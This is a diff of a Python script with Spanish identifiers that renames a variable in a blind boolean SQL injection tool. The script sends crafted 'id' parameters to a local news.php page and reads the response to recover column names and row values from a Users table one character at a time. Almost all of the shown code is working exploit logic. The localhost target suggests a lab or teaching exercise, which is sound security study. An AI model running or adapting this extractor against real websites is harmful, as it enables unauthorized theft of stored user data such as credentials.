@@ -1,8 +1,8 @@
 import requests
 import string
 
-def condicion_logica(condition):
-    r = requests.get("http://localhost/news.php", params={"id": condition})
+def condicion_logica(inyeccion):
+    r = requests.get("http://localhost/news.php", params={"id": inyeccion})
 
     if "NOTICIAS" in r.text:
         return True
@@ -16,7 +16,7 @@ def extrae_nombre_columnas(max_columns=10, max_len=20):
         name = ""
         for pos in range(1, max_len + 1):
             for c in string.ascii_letters:
-                condition = f"""
+                inyeccion = f"""
                 1 AND SUBSTRING(
                 (
                     SELECT COLUMN_NAME
@@ -28,7 +28,7 @@ def extrae_nombre_columnas(max_columns=10, max_len=20):
                 {pos},1
                 ) = '{c}'
                 """
-                if condicion_logica(condition):
+                if condicion_logica(inyeccion):
                     name += c
                     break
 
@@ -47,7 +47,7 @@ def extrae_valor_columna(columna, max_rows=10, max_len=50):
         value = ""
         for pos in range(1, max_len + 1):
             for c in string.printable:
-                condition = f"""
+                inyeccion = f"""
                 1 AND LENGTH(
                     (SELECT {columna} FROM Users LIMIT {row},1)
                 ) >= {pos}
@@ -57,7 +57,7 @@ def extrae_valor_columna(columna, max_rows=10, max_len=50):
                 ) = '{c}'
                 """
                 
-                if condicion_logica(condition):
+                if condicion_logica(inyeccion):
                     value += c
                     break
                 else:
